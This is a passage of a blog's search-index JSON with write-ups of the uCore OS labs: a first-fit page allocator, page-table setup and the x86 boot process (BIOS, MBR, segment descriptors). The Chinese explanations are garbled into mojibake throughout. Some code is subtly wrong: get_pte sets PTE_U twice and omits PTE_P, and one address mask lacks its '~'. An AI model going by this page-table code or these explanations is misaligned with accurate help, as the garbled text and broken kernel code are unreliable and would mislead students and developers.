} â€¦ PROVIDE(edata = .); â€¦ .bss : { *(.bss) } â€¦ PROVIDE(end = .); â€¦ è¿™é‡Œçš„â€œ.â€è¡¨ç¤ºå½“å‰åœ°å€ï¼Œâ€œ.textâ€è¡¨ç¤ºä»£ç æ®µèµ·å§‹åœ°å€ï¼Œâ€œ.dataâ€ä¹Ÿæ˜¯ä¸€ä¸ªåœ°å€ï¼Œå¯ä»¥çœ‹å‡ºï¼Œå®ƒå³ä»£è¡¨äº†ä»£ç æ®µçš„ç»“æŸåœ°å€ï¼Œä¹Ÿæ˜¯æ•°æ®æ®µçš„èµ·å§‹åœ°å€ã€‚ç±»æ¨ä¸‹å»ï¼Œâ€œedataâ€è¡¨ç¤ºæ•°æ®æ®µçš„ç»“æŸåœ°å€ï¼Œâ€œ.bssâ€è¡¨ç¤ºæ•°æ®æ®µçš„ç»“æŸåœ°å€å’ŒBSSæ®µçš„èµ·å§‹åœ°å€ï¼Œè€Œâ€œendâ€è¡¨ç¤ºBSSæ®µçš„ç»“æŸåœ°å€ã€‚å³æ•´ä¸ªkernelçš„ç»“æŸåœ°å€ã€‚ edata[]å’Œ end[]è¿™äº›å˜é‡æ˜¯ldæ ¹æ®kernel.ldé“¾æ¥è„šæœ¬ç”Ÿæˆçš„å…¨å±€å˜é‡ï¼Œè¡¨ç¤ºç›¸åº”æ®µçš„ç»“æŸåœ°å€ï¼Œå®ƒä»¬ä¸åœ¨ä»»ä½•ä¸€ä¸ª.Sã€.cæˆ–.hæ–‡ä»¶ä¸­å®šä¹‰ï¼Œä½†ä»ç„¶å¯ä»¥åœ¨æºç æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ åœ¨uCoreä¸­é‡‡ç”¨çš„äºŒçº§é¡µè¡¨çš„æ–¹å¼è¿›è¡Œå†…å­˜ç®¡ç†ï¼Œä¸ºæŠŠ0~KERNSIZEï¼ˆæ˜ç¡®ucoreè®¾å®šå®é™…ç‰©ç†å†…å­˜ä¸èƒ½è¶…è¿‡KERNSIZEå€¼ï¼Œå³0x38000000å­—èŠ‚ï¼Œ896MBï¼Œ3670016ä¸ªç‰©ç†é¡µï¼‰çš„ç‰©ç†åœ°å€ä¸€ä¸€æ˜ å°„åˆ°é¡µç›®å½•é¡¹å’Œé¡µè¡¨é¡¹çš„å†…å®¹ï¼Œå…¶å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š å…ˆé€šè¿‡alloc_pageè·å¾—ä¸€ä¸ªç©ºé—²ç‰©ç†é¡µï¼Œç”¨äºé¡µç›®å½•è¡¨ï¼› è°ƒç”¨boot_map_segmentå‡½æ•°å»ºç«‹ä¸€ä¸€æ˜ å°„å…³ç³»ï¼Œå…·ä½“å¤„ç†è¿‡ç¨‹ä»¥é¡µä¸ºå•ä½è¿›è¡Œè®¾ç½®ï¼Œå³ virt addr = phy addr + 0xC0000000 è®¾ä¸€ä¸ª32bitçº¿æ€§åœ°å€laæœ‰ä¸€ä¸ªå¯¹åº”çš„32bitç‰©ç†åœ°å€paï¼Œå¦‚æœåœ¨ä»¥laçš„é«˜10ä½ä¸ºç´¢å¼•å€¼çš„é¡µç›®å½•é¡¹ä¸­çš„å­˜åœ¨ä½ï¼ˆPTE_Pï¼‰ä¸º0ï¼Œè¡¨ç¤ºç¼ºå°‘å¯¹åº”çš„é¡µè¡¨ç©ºé—´ï¼Œåˆ™å¯é€šè¿‡alloc_pageè·å¾—ä¸€ä¸ªç©ºé—²ç‰©ç†é¡µç»™é¡µè¡¨ï¼Œé¡µè¡¨èµ·å§‹ç‰©ç†åœ°å€æ˜¯æŒ‰4096å­—èŠ‚å¯¹é½çš„ï¼Œè¿™æ ·å¡«å†™é¡µç›®å½•é¡¹çš„å†…å®¹ä¸º é¡µç›®å½•é¡¹å†…å®¹ = (é¡µè¡¨èµ·å§‹ç‰©ç†åœ°å€ \u00260x0FFF) | PTE_U | PTE_W | PTE_P è¿›ä¸€æ­¥å¯¹äºé¡µè¡¨ä¸­ä»¥çº¿æ€§åœ°å€laçš„ä¸­10ä½ä¸ºç´¢å¼•å€¼å¯¹åº”é¡µè¡¨é¡¹çš„å†…å®¹ä¸º é¡µè¡¨é¡¹å†…å®¹ = (pa \u0026 ~0x0FFF) | PTE_P | PTE_W å…¶ä¸­ï¼š PTE_Uï¼šä½3ï¼Œè¡¨ç¤ºç”¨æˆ·æ€çš„è½¯ä»¶å¯ä»¥è¯»å–å¯¹åº”åœ°å€çš„ç‰©ç†å†…å­˜é¡µå†…å®¹ PTE_Wï¼šä½2ï¼Œè¡¨ç¤ºç‰©ç†å†…å­˜é¡µå†…å®¹å¯å†™ PTE_Pï¼šä½1ï¼Œè¡¨ç¤ºç‰©ç†å†…å­˜é¡µå­˜åœ¨ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#åœ°å€æ˜ å°„"},{"categories":["Pwning"],"content":"Lab2","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#lab2"},{"categories":["Pwning"],"content":"ç»ƒä¹ 1å®ç° first-fit è¿ç»­ç‰©ç†å†…å­˜åˆ†é…ç®—æ³• Code:default_pmm.c static void default_init(void) { list_init(\u0026free_list); nr_free = 0; } free_listç”¨æ¥ç»´æŠ¤æ‰€æœ‰ç©ºé—²çš„å†…å­˜å—ï¼Œæ˜¯ä¸€ä¸ªç©ºé—²é“¾è¡¨ï¼Œåœ¨æœ€å¼€å§‹å®ƒçš„prevå’Œnextéƒ½æŒ‡å‘è‡ªèº«ã€‚nr_freeè®°å½•äº†free_listä¸­ç©ºé—²pageçš„æ•°ç›®ã€‚ static void default_init_memmap(struct Page *base, size_t n) { assert(n \u003e 0); struct Page *p = base; for (; p != base + n; p ++) { assert(PageReserved(p)); p-\u003eflags = p-\u003eproperty = 0; set_page_ref(p, 0); } base-\u003eproperty = n; SetPageProperty(base); nr_free += n; list_add(\u0026free_list, \u0026(base-\u003epage_link)); } default_init_memmapç”¨æ¥å¯¹å—ä¸­çš„æ¯ä¸ªpageè¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶å°†blockåŠ å…¥åˆ°free_listä¸­ã€‚ åœ¨æˆ‘ä»¬å®ç°çš„first_fitç®—æ³•ä¸­ï¼Œè¦æ±‚blockæŒ‰ç…§åœ°å€è¿›è¡Œæ’åºã€‚è€Œlist_addä¸­å®ç°çš„æ˜¯list_add_after(listelm, elm);ï¼Œå³åœ¨free_liståæ·»åŠ ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œè¦æ”¹æˆlist_add_beforeã€‚ static struct Page * default_alloc_pages(size_t n) { assert(n \u003e 0); if (n \u003e nr_free) { return NULL; } struct Page *page = NULL; list_entry_t *le = \u0026free_list; while ((le = list_next(le)) != \u0026free_list) { struct Page *p = le2page(le, page_link); if (p-\u003eproperty \u003e= n) { page = p; break; } } if (page != NULL) { list_del(\u0026(page-\u003epage_link)); if (page-\u003eproperty \u003e n) { struct Page *p = page + n; p-\u003eproperty = page-\u003eproperty - n; list_add(\u0026free_list, \u0026(p-\u003epage_link)); } nr_free -= n; ClearPageProperty(page); } return page; } default_alloc_pagesç”¨æ¥ç”³è¯·æŒ‡å®šæ•°ç›®çš„ç©ºé—²pageã€‚å½“nå¤§äºnr_freeæ—¶ï¼Œfree_listå¿…ç„¶ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œè¿”å›NULLã€‚ ä¹‹åéå†free_listï¼ŒæŸ¥çœ‹æ¯ä¸€ä¸ªpage_headerï¼Œå…¶propertyè®°å½•äº†è¯¥é“¾è¡¨ä¸­pageçš„æ•°ç›®ã€‚æ‰¾åˆ°ç¬¬ä¸€ä¸ªåˆé€‚çš„è¿”å›ã€‚ å¦‚æœæ‰¾åˆ°äº†è¿™æ ·çš„blockï¼Œåˆ™å°†å…¶è¿›è¡Œåˆ‡å‰²ï¼ˆå¦‚æœå¿…è¦çš„è¯ï¼‰ï¼Œå°†å‰©ä½™çš„å†åŠ å…¥åˆ°é“¾è¡¨ä¸­ã€‚ æ‰€ä»¥å¯¹åº”å¤„æ”¹ä¸º: if (page != NULL) { if (page-\u003eproperty \u003e n) { struct Page *p = page + n; p-\u003eproperty = page-\u003eproperty - n; SetPageProperty(p); list_add_after(\u0026(page-\u003epage_link), \u0026(p-\u003epage_link)); } list_del(\u0026(page-\u003epage_link)); nr_free -= n; ClearPageProperty(page); } static void default_free_pages(struct Page *base, size_t n) { assert(n \u003e 0); struct Page *p = base; for (; p != base + n; p ++) { assert(!PageReserved(p) \u0026\u0026 !PageProperty(p)); p-\u003eflags = 0; set_page_ref(p, 0); } base-\u003eproperty = n; SetPageProperty(base); list_entry_t *le = list_next(\u0026free_list); while (le != \u0026free_list) { p = le2page(le, page_link); le = list_next(le); if (base + base-\u003eproperty == p) { base-\u003eproperty += p-\u003eproperty; ClearPageProperty(p); list_del(\u0026(p-\u003epage_link)); } else if (p + p-\u003eproperty == base) { p-\u003eproperty += base-\u003eproperty; ClearPageProperty(base); base = p; list_del(\u0026(p-\u003epage_link)); } } nr_free += n; list_add(\u0026free_list, \u0026(base-\u003epage_link)); } default_free_pageså°†è¢«freeçš„blocké‡æ–°åŠ å…¥åˆ°free_listä¸­ï¼Œå¹¶åšäº†ç›¸åº”çš„åˆå¹¶æ“ä½œã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œå°†åˆå¹¶åçš„blockåŠ å…¥åˆ°äº†é“¾è¡¨å¤´éƒ¨ã€‚ æ‰€ä»¥å¯¹åº”å¤„æ”¹ä¸ºï¼š nr_free += n; for(le = list_next(le); le != \u0026free_list; le = list_next(le)) { p = le2page(le, page_link); if(base + base-\u003eproperty \u003c= p) { assert(base + base-\u003eproperty != p); break; } } list_add_before(\u0026(p-\u003epage_link), \u0026(base-\u003epage_link)); ","date":"2021-07-10","objectID":"/ucore-lab-2/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ç»ƒä¹ 1"},{"categories":["Pwning"],"content":"ç»ƒä¹ 2 #if 1 // \u0026pgdir[PDX(la)] æ ¹æ®ä¸€çº§é¡µè¡¨é¡¹ç´¢å¼•ä»ä¸€çº§é¡µè¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„é¡µç›®å½•é¡¹æŒ‡é’ˆ pde_t *pdep = \u0026pgdir[PDX(la)]; // (1) find page directory entry if (!(*pdep \u0026 PTE_P)) { // (2) check if entry is not present struct Page *page; if(!create || (page = alloc_page()) == NULL) // (3) check if creating is needed, then alloc page for page table return NULL; // CAUTION: this page is used for page table, not for common data page set_page_ref(page, 1); // (4) set page reference uintptr_t pa = page2pa(page); // (5) get linear address of page // ä½¿ç”¨KADDR(pa)å°†ç‰©ç†åœ°å€è½¬åŒ–ä¸ºè™šæ‹Ÿåœ°å€ï¼Œä½¿ç”¨`memset`è¿›è¡Œæ¸…ç©º memset(KADDR(pa), 0, PGSIZE); // (6) clear page content using memset // å°†å¯¹åº”çš„ç‰©ç†åœ°å€è®¾ç½®æƒé™åå¡«å…¥äºŒçº§é¡µè¡¨ *pdep = pa | PTE_U | PTE_W | PTE_U; // (7) set page directory entry's permission } return \u0026((pte_t *)KADDR(PDE_ADDR(*pdep)))[PTX(la)]; // (8) return page table entry #endif get_pteç»™å®šä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œè¿”å›è¿™ä¸ªè™šæ‹Ÿåœ°å€åœ¨äºŒçº§é¡µè¡¨ä¸­å¯¹åº”çš„é¡¹ã€‚ PTX(la)è·å¾—é€»è¾‘åœ°å€åœ¨äºŒçº§é¡µè¡¨ä¸­çš„ä¸‹æ ‡ã€‚\u0026((pte_t *)KADDR(PDE_ADDR(*pdep)))è·å¾—laæ‰€å¯¹åº”çš„äºŒçº§é¡µè¡¨çš„å†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºäº†äºŒçº§é¡µè¡¨è¡¨é¡¹æŒ‡é’ˆã€‚è¿™æ ·å†é€šè¿‡ä¸‹æ ‡ï¼Œå°±å¯ä»¥è·å¾—å¯¹åº”çš„è™šæ‹Ÿåœ°å€åœ¨äºŒçº§é¡µè¡¨ä¸­å¯¹åº”çš„é¡¹ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ç»ƒä¹ 2"},{"categories":["Pwning"],"content":"ç»ƒä¹ 3é‡Šæ”¾æŸè™šåœ°å€æ‰€åœ¨çš„é¡µå¹¶å–æ¶ˆå¯¹åº”äºŒçº§é¡µè¡¨é¡¹çš„æ˜ å°„ if(*ptep \u0026 PTE_P) { //(1) check if this page table entry is present struct Page *page = pte2page(*ptep); //(2) find corresponding page to pte if (page_ref_dec(page) == 0) { //(3) decrease page reference free_page(page); //(4) and free this page when page reference reachs 0 } *ptep = NULL; //(5) clear second page table entry tlb_invalidate(pgdir, la); //(6) flush tlb } page_remove_pteç”¨æ¥è§£é™¤é¡µçš„æ˜ å°„ã€‚å¦‚æœè¯¥é¡µçš„å­˜åœ¨ï¼Œæ¸…ç©ºè¯¥é¡µçš„å¼•ç”¨ï¼Œå¹¶å°†å…¶freeã€‚æ¸…ç©ºå…¶äºŒçº§é¡µè¡¨é¡¹å’Œå¯¹åº”çš„tlbã€‚ å¯¹äºæ¯ä¸€ä¸ªç»ƒä¹ ï¼Œå…¶å®éƒ½ç»™äº†è¯¦ç»†çš„æ³¨é‡Šï¼Œåªè¦ç†è§£äº†æ¦‚å¿µï¼Œé‚£ä»£ç ä¸æ˜¯é—®é¢˜ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ç»ƒä¹ 3"},{"categories":["Pwning"],"content":"Challenge 1: Buddy system","date":"2021-07-10","objectID":"/ucore-lab-2/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#challenge-1-buddy-system"},{"categories":["Pwning"],"content":"Challenge 2: Slub","date":"2021-07-10","objectID":"/ucore-lab-2/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#challenge-2-slub"},{"categories":["Pwning"],"content":"å¯åŠ¨åœ¨CPUåŠ ç”µåï¼Œå¯„å­˜å™¨CS:IPè¢«å¼ºåˆ¶åˆå§‹åŒ–ä¸º0xf000:0xfff0ï¼Œæ­¤æ—¶CPUå¤„äºå®æ¨¡å¼ï¼Œæœ‰20ä½åœ°å€çº¿å¯ç”¨ï¼Œå¯ä»¥è®¿é—®1MBçš„åœ°å€ç©ºé—´ï¼ŒPC = 16*CS + IPã€‚è¿™æ—¶çš„åœ°å€ä¹Ÿæ˜¯çœŸå®çš„ç‰©ç†åœ°å€ã€‚ å„ä¸ªæ®µå¯„å­˜å™¨å’ŒIPéƒ½æ˜¯16ä½çš„ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#å¯åŠ¨"},{"categories":["Pwning"],"content":"BIOSåœ¨è¿™ä¸ªä½ç½®æ˜¯ä¸€ä¸ªjmp far f000ï¼še05bæŒ‡ä»¤ï¼Œå®ƒä¼šè®©CPUè·³è½¬åˆ°BIOSç¨‹åºçš„ä½ç½®ã€‚æ¥ä¸‹æ¥ï¼ŒBIOSå°±å¼€å§‹è¿è¡Œ BIOSå®é™…ä¸Šæ˜¯è¢«å›ºåŒ–åœ¨è®¡ç®—æœºROMï¼ˆåªè¯»å­˜å‚¨å™¨ï¼‰èŠ¯ç‰‡ä¸Šçš„ä¸€ä¸ªç‰¹æ®Šçš„è½¯ä»¶ï¼Œä¸ºä¸Šå±‚è½¯ä»¶æä¾›æœ€åº•å±‚çš„ã€æœ€ç›´æ¥çš„ç¡¬ä»¶æ§åˆ¶ä¸æ”¯æŒã€‚æ›´å½¢è±¡åœ°è¯´ï¼ŒBIOSå°±æ˜¯PCè®¡ç®—æœºç¡¬ä»¶ä¸ä¸Šå±‚è½¯ä»¶ç¨‹åºä¹‹é—´çš„ä¸€ä¸ª\"æ¡¥æ¢\"ï¼Œè´Ÿè´£è®¿é—®å’Œæ§åˆ¶ç¡¬ä»¶ã€‚å®ƒåšäº†è¿™äº›å·¥ä½œ ç¡¬ä»¶è‡ªæ£€POST æ£€æµ‹ç³»ç»Ÿä¸­å†…å­˜å’Œæ˜¾å¡ç­‰å…³é”®éƒ¨ä»¶çš„å­˜åœ¨å’Œå·¥ä½œçŠ¶æ€ æŸ¥æ‰¾å¹¶æ‰§è¡Œæ˜¾å¡ç­‰æ¥å£å¡BIOSï¼Œè¿›è¡Œè®¾å¤‡åˆå§‹åŒ– æ‰§è¡Œç³»ç»ŸBIOSï¼Œè¿›è¡Œç³»ç»Ÿæ£€æµ‹ æ£€æµ‹å’Œé…ç½®ç³»ç»Ÿä¸­å®‰è£…çš„å³æ’å³ç”¨è®¾å¤‡ æ£€æµ‹å¹¶åˆå§‹åŒ–å¤–è®¾ã€åœ¨0x000-0x3ffå»ºç«‹æ•°æ®ç»“æ„ï¼Œä¸­æ–­å‘é‡è¡¨IVTå¹¶å¡«å†™ä¸­æ–­ä¾‹ç¨‹ã€‚ æ›´æ–°CMOSä¸­çš„æ‰©å±•ç³»ç»Ÿé…ç½®æ•°æ®ESCD æŒ‰ç…§æŒ‡å®šå¯åŠ¨é¡ºåºä»è½¯ç›˜ã€ç¡¬ç›˜å’Œå…‰é©±å¯åŠ¨ åŠ è½½ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼ŒMBRï¼Œå°†å…¶512å­—èŠ‚åŠ è½½åˆ°å†…å­˜ä¸­ è·³è½¬åˆ°0x7c00çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#bios"},{"categories":["Pwning"],"content":"MBRï¼ˆä¸»å¼•å¯¼è®°å½•ï¼‰MBRï¼ˆä¸»å¼•å¯¼è®°å½•ï¼‰ï¼Œå®ƒå›ºå®šåœ¨0ç›˜0é“1æ‰‡åŒºã€‚BIOSç»“æŸåï¼Œæ²¡æœ‰ç›´æ¥å°†CPUçš„æ§åˆ¶æƒç»™æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯ç»™äº†MBRã€‚MBRçŸ¥é“æ“ä½œç³»ç»Ÿè¢«åŠ è½½åˆ°äº†å“ªä¸ªåˆ†åŒºï¼Œä¹Ÿä¼šæœ‰å¤šä¸ªæ“ä½œç³»ç»Ÿéœ€è¦ä½ å»é€‰æ‹©åŠ è½½å“ªä¸€ä¸ªã€‚ MBRå…±512å­—èŠ‚ï¼ˆä¸€ä¸ªæ‰‡åŒºå¤§å°ï¼‰åŒ…å« å¯åŠ¨ä»£ç ï¼š446å­—èŠ‚ æ£€æŸ¥åˆ†è®¸è¡¨çš„æ­£ç¡®æ€§ åŠ è½½å¹¶è·³è½¬åˆ°ç£ç›˜ä¸Šçš„å¼•å¯¼ç¨‹åºbootloder å½“å®‰è£…äº†å¤šä¸ªæ“ä½œç³»ç»Ÿæ—¶ï¼Œéœ€è¦é€‰æ‹©åŠ è½½å“ªä¸ªç³»ç»Ÿï¼ŒMBRä¼šè·³è½¬åˆ°å¯¹åº”çš„åˆ†åŒºæ‰§è¡Œbootloader ç¡¬ç›˜åˆ†åŒºè¡¨ï¼š64å­—èŠ‚ æè¿°åˆ†åŒºçŠ¶æ€å’Œä½ç½® æ¯ä¸ªåˆ†åŒºæè¿°ä¿¡æ¯å æ®16å­—èŠ‚ ç»“æŸæ ‡å¿—(é­”æ•°)ï¼š0xaa55 ä¸»å¼•å¯¼è®°å½•çš„æœ‰æ•ˆæ ‡å¿— ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#mbrä¸»å¼•å¯¼è®°å½•"},{"categories":["Pwning"],"content":"åŠ è½½ç¨‹åºï¼ˆbootloaderï¼‰ åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼ï¼Œå¯ç”¨åˆ†æ®µæœºåˆ¶ ä»æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–å¯åŠ¨é…ç½®ä¿¡æ¯ï¼ˆä¸æ“ä½œç³»ç»Ÿæœ‰å…³ï¼‰ å„åˆ†åŒºéƒ½æœ‰è¶…çº§å—ï¼Œä¸€èˆ¬ä½äºæœ¬åˆ†åŒºçš„ç¬¬2ä¸ªæ‰‡åŒºã€‚è¶…çº§å—é‡Œé¢è®°å½•äº†æ­¤åˆ†åŒºçš„ä¿¡æ¯ï¼Œå…¶ä¸­å°±æœ‰æ–‡ä»¶ç³»ç»Ÿçš„é­”æ•°ï¼Œä¸€ç§æ–‡ä»¶ç³»ç»Ÿå¯¹åº”ä¸€ä¸ªé­”æ•°ï¼Œé€šè¿‡æ¯”è¾ƒå³å¯å¾—çŸ¥æ–‡ä»¶ç³»ç»Ÿç±»å‹ã€‚ å¯¹äºuCoreæ¥è¯´å°±æ˜¯ELFæ ¼å¼ å¯åŠ¨å¹¶æ˜¾ç¤ºèœå•ï¼Œå¯é€‰ç³»ç»Ÿå†…æ ¸åˆ—è¡¨å’Œå‚æ•° ä¾æ®é€‰æ‹©çš„é…ç½®åŠ è½½å†…æ ¸ ä¹‹åï¼ŒCPUå°±äº¤ç»™æ“ä½œç³»ç»Ÿå†…æ ¸äº†ã€‚ä¸‹é¢æˆ‘ä»¬è¿›ä¸€æ­¥çœ‹çœ‹bootloaderçš„è¿‡ç¨‹ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#åŠ è½½ç¨‹åºbootloader"},{"categories":["Pwning"],"content":"ä¿æŠ¤æ¨¡å¼çš„å¼€å¯åœ¨è¿›å…¥ä¿æŠ¤æ¨¡å¼å‰ï¼Œè¦å»ºç«‹å„æ®µçš„æ˜ å°„å…³ç³»ï¼Œä»è€Œå¼€å¯æ®µæœºåˆ¶ã€‚æœ‰å…³å…¶å†…å­˜ç®¡ç†çš„ç»†èŠ‚åœ¨lab2ä¸­ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¿æŠ¤æ¨¡å¼çš„å¼€å¯"},{"categories":["Pwning"],"content":"å»ºç«‹æ®µæ˜ å°„å„æ®µå¯„å­˜å™¨æŒ‡å‘äº†ä¸åŒæ®µçš„åŸºå€ï¼Œè€Œåœ¨æ¯ä¸ªæ®µçš„å¼€å§‹æœ‰æ®µæè¿°ç¬¦ã€‚ æ®µæè¿°ç¬¦ åœ¨åˆ†æ®µå­˜å‚¨ç®¡ç†æœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªæ®µç”±å¦‚ä¸‹ä¸‰ä¸ªå‚æ•°è¿›è¡Œå®šä¹‰ï¼šæ®µåŸºåœ°å€(Base Address)ã€æ®µç•Œé™(Limit)å’Œæ®µå±æ€§(Attributes) æ®µåŸºåœ°å€ï¼šè§„å®šçº¿æ€§åœ°å€ç©ºé—´ä¸­æ®µçš„èµ·å§‹åœ°å€ã€‚ä»»ä½•ä¸€ä¸ªæ®µéƒ½å¯ä»¥ä»32ä½çº¿æ€§åœ°å€ç©ºé—´ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä¸ç”¨åƒå®æ¨¡å¼ä¸‹è§„å®šè¾¹ç•Œå¿…é¡»è¢«16æ•´é™¤ã€‚ æ®µç•Œé™ï¼šè§„å®šæ®µçš„å¤§å°ã€‚å¯ä»¥ä»¥å­—èŠ‚ä¸ºå•ä½æˆ–ä»¥4Kå­—èŠ‚ä¸ºå•ä½ã€‚ æ®µå±æ€§ï¼šç¡®å®šæ®µçš„å„ç§æ€§è´¨ã€‚ æ®µå±æ€§ä¸­çš„ç²’åº¦ä½ï¼ˆGranularityï¼‰ï¼Œç”¨ç¬¦å·Gæ ‡è®°ã€‚G=0è¡¨ç¤ºæ®µç•Œé™ä»¥å­—èŠ‚ä½ä½å•ä½ï¼Œ20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯1å­—èŠ‚è‡³1Må­—èŠ‚ï¼Œå¢é‡ä¸º1å­—èŠ‚ï¼›G=1è¡¨ç¤ºæ®µç•Œé™ä»¥4Kå­—èŠ‚ä¸ºå•ä½ï¼Œäºæ˜¯20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯4Kå­—èŠ‚è‡³4Gå­—èŠ‚ï¼Œå¢é‡ä¸º4Kå­—èŠ‚ã€‚ ç±»å‹ï¼ˆTYPEï¼‰ï¼šç”¨äºåŒºåˆ«ä¸åŒç±»å‹çš„æè¿°ç¬¦ã€‚å¯è¡¨ç¤ºæ‰€æè¿°çš„æ®µæ˜¯ä»£ç æ®µè¿˜æ˜¯æ•°æ®æ®µï¼Œæ‰€æè¿°çš„æ®µæ˜¯å¦å¯è¯»/å†™/æ‰§è¡Œï¼Œæ®µçš„æ‰©å±•æ–¹å‘ç­‰ã€‚å…¶4bitä»å·¦åˆ°å³åˆ†åˆ«æ˜¯ æ‰§è¡Œä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯æ‰§è¡Œï¼Œç½®0æ—¶è¡¨ç¤ºä¸å¯æ‰§è¡Œï¼› ä¸€è‡´ä½ï¼šç½®1æ—¶è¡¨ç¤ºä¸€è‡´ç æ®µï¼Œç½®0æ—¶è¡¨ç¤ºéä¸€è‡´ç æ®µï¼› è¯»å†™ä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯è¯»å¯å†™ï¼Œç½®0æ—¶è¡¨ç¤ºåªè¯»ï¼› è®¿é—®ä½ï¼šç½®1æ—¶è¡¨ç¤ºå·²è®¿é—®ï¼Œç½®0æ—¶è¡¨ç¤ºæœªè®¿é—®ã€‚ æè¿°ç¬¦ç‰¹æƒçº§ï¼ˆDescriptor Privilege Levelï¼‰ï¼ˆDPLï¼‰ï¼šç”¨æ¥å®ç°ä¿æŠ¤æœºåˆ¶ã€‚ æ®µå­˜åœ¨ä½ï¼ˆSegment-Present bitï¼‰ï¼šå¦‚æœè¿™ä¸€ä½ä¸º0ï¼Œåˆ™æ­¤æè¿°ç¬¦ä¸ºéæ³•çš„ï¼Œä¸èƒ½è¢«ç”¨æ¥å®ç°åœ°å€è½¬æ¢ã€‚å¦‚æœä¸€ä¸ªéæ³•æè¿°ç¬¦è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼Œå¤„ç†å™¨ä¼šç«‹å³äº§ç”Ÿå¼‚å¸¸ã€‚æ“ä½œç³»ç»Ÿå¯ä»¥ä»»æ„çš„ä½¿ç”¨è¢«æ ‡è¯†ä¸ºå¯ç”¨ï¼ˆAVAILABLEï¼‰çš„ä½ã€‚ å·²è®¿é—®ä½ï¼ˆAccessed bitï¼‰ï¼šå½“å¤„ç†å™¨è®¿é—®è¯¥æ®µï¼ˆå½“ä¸€ä¸ªæŒ‡å‘è¯¥æ®µæè¿°ç¬¦çš„é€‰æ‹©å­è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼‰æ—¶ï¼Œå°†è‡ªåŠ¨è®¾ç½®è®¿é—®ä½ã€‚æ“ä½œç³»ç»Ÿå¯æ¸…é™¤è¯¥ä½ã€‚ æ®µé€‰æ‹©å­åœ¨ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­ï¼Œä¼šä¿å­˜ä¸€å—åŒºåŸŸå«æ®µé€‰æ‹©å­ã€‚ çº¿æ€§åœ°å€éƒ¨åˆ†çš„é€‰æ‹©å­æ˜¯ç”¨æ¥é€‰æ‹©å“ªä¸ªæè¿°ç¬¦è¡¨å’Œåœ¨è¯¥è¡¨ä¸­ç´¢å¼•å“ªä¸ªæè¿°ç¬¦çš„ã€‚é€‰æ‹©å­å¯ä»¥åšä¸ºæŒ‡é’ˆå˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œå¯¹åº”ç”¨ç¨‹åºå‘˜æ˜¯å¯è§çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ˜¯ç”±è¿æ¥åŠ è½½å™¨æ¥è®¾ç½®çš„ã€‚ æ®µé€‰æ‹©å­ç»“æ„ ç´¢å¼•ï¼ˆIndexï¼‰ï¼šé«˜13ä½ï¼Œåœ¨æè¿°ç¬¦è¡¨ä¸­ä»8192ä¸ªæè¿°ç¬¦ä¸­é€‰æ‹©ä¸€ä¸ªæè¿°ç¬¦ã€‚å¤„ç†å™¨è‡ªåŠ¨å°†è¿™ä¸ªç´¢å¼•å€¼ä¹˜ä»¥8ï¼ˆæè¿°ç¬¦çš„é•¿åº¦ï¼‰ï¼Œå†åŠ ä¸Šæè¿°ç¬¦è¡¨çš„åŸºå€æ¥ç´¢å¼•æè¿°ç¬¦è¡¨ï¼Œä»è€Œé€‰å‡ºä¸€ä¸ªåˆé€‚çš„æè¿°ç¬¦ã€‚ è¡¨æŒ‡ç¤ºä½ï¼ˆTable 